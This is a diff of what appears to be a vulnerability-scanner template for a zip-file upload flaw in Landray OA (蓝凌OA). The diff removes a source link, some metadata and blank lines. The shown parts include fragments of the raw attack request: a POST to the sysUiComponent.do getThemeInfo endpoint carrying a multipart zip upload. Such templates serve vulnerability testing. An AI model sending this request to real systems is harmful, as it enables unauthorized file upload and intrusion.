@@ -3,12 +3,8 @@ info:
   name: 蓝凌OA sysUiComponent.do Zip上传漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zegfiwhsm42l2qng'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zegfiwhsm42l2qng
-    fofa: 暂无
 http:
 - raw:
   - 'POST /sys/ui/sys_ui_component/sysUiComponent.do?method=getThemeInfo&s_ajax=true HTTP/1.1
@@ -38,8 +34,6 @@ http:
     Connection: close
 
 
-
-
     -----------------------------15610248407689
 
 
@@ -47,8 +41,6 @@ http:
 
 
     Content-Type: application/x-zip-compressed
-
-
 
 
     PK
